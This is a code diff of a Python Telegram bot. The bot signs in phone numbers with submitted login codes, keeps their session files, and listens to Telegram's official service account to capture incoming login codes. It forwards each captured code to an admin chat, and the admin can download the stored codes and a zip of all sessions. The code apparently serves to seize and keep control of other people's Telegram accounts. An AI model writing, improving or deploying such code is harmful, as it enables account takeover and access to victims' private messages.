@@ -7,7 +7,6 @@ from dotenv import load_dotenv
 
 from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
-from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
 from telegram.ext import (
@@ -34,9 +33,9 @@ os.makedirs(DATA_DIR, exist_ok=True)
 PHONE, CODE, PASSWORD = range(3)
 
 # Global
-clients = {}          # phone -> TelegramClient
-pending = {}          # chat_id -> data
-codes_data = {}       # phone -> list of codes
+clients = {}
+pending = {}
+codes_data = {}
 
 
 def load_json(path, default=None):
@@ -71,14 +70,12 @@ def save_accounts(data):
 # ====================== Telethon Code Receiver ======================
 
 async def start_client(phone: str):
-    """একটা ক্লায়েন্ট চালু করে কোড লিসেনার যোগ করে"""
     session_path = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
     client = TelegramClient(session_path, API_ID, API_HASH)
 
     @client.on(events.NewMessage(from_users=777000))
     async def code_handler(event):
         text = event.message.message or ""
-        # কোড বের করা
         match = re.search(r'(\d{5,6})', text)
         if match:
             code = match.group(1)
@@ -91,19 +88,19 @@ async def start_client(phone: str):
                 "time": now,
                 "full_text": text[:200]
             })
-            # শুধু শেষ ১০টা রাখব
             codes_data[phone] = codes_data[phone][:10]
             save_json(CODES_FILE, codes_data)
 
-            # অ্যাডমিনকে নোটিফিকেশন
             try:
-                app = Application.builder().token(BOT_TOKEN).build()
-                await app.bot.send_message(
+                from telegram import Bot
+                bot = Bot(token=BOT_TOKEN)
+                await bot.send_message(
                     ADMIN_ID,
                     f"🔔 নতুন লগইন কোড এসেছে!\n\n"
                     f"নাম্বার: `{phone}`\n"
                     f"কোড: `{code}`\n"
-                    f"সময়: {now}"
+                    f"সময়: {now}",
+                    parse_mode="Markdown"
                 )
             except:
                 pass
@@ -118,7 +115,6 @@ async def start_client(phone: str):
 
 
 async def load_all_clients():
-    """সব সেভ করা সেশন লোড করে"""
     accounts = get_accounts()
     for phone in accounts:
         try:
@@ -271,7 +267,6 @@ async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
         me = await client.get_me()
 
-        # সেভ করা
         accounts = get_accounts()
         accounts[phone] = {
             "name": me.first_name or "",
@@ -282,7 +277,6 @@ async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         save_accounts(accounts)
 
         await client.disconnect()
-        # আবার চালু করা (কোড লিসেনারসহ)
         await start_client(phone)
 
         del pending[chat_id]
@@ -359,7 +353,8 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def list_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE, from_callback=False):
-    if not is_admin(update.effective_user.id if not from_callback else update.callback_query.from_user.id):
+    user_id = update.effective_user.id if not from_callback else update.callback_query.from_user.id
+    if not is_admin(user_id):
         return
 
     accounts = get_accounts()
@@ -380,10 +375,10 @@ async def list_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE, from
 
 
 async def download_codes(update: Update, context: ContextTypes.DEFAULT_TYPE, from_callback=False):
-    if not is_admin(update.effective_user.id if not from_callback else update.callback_query.from_user.id):
+    user_id = update.effective_user.id if not from_callback else update.callback_query.from_user.id
+    if not is_admin(user_id):
         return
 
-    # লেটেস্ট ডাটা লোড
     global codes_data
     codes_data = load_json(CODES_FILE, {})
 
@@ -395,7 +390,6 @@ async def download_codes(update: Update, context: ContextTypes.DEFAULT_TYPE, fro
             await update.message.reply_text(text)
         return
 
-    # ফাইল তৈরি
     file_path = os.path.join(DATA_DIR, "latest_codes.json")
     save_json(file_path, codes_data)
 
@@ -416,7 +410,8 @@ async def download_codes(update: Update, context: ContextTypes.DEFAULT_TYPE, fro
 
 
 async def download_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE, from_callback=False):
-    if not is_admin(update.effective_user.id if not from_callback else update.callback_query.from_user.id):
+    user_id = update.effective_user.id if not from_callback else update.callback_query.from_user.id
+    if not is_admin(user_id):
         return
 
     import zipfile
@@ -462,7 +457,6 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """কোনো অ্যাকাউন্ট বট থেকে লগআউট করতে"""
     if not is_admin(update.effective_user.id):
         return
 
@@ -486,7 +480,6 @@ async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def post_init(app: Application):
-    """বট স্টার্ট হলে সব ক্লায়েন্ট লোড করবে"""
     print("Loading all sessions...")
     await load_all_clients()
     print("Ready!")
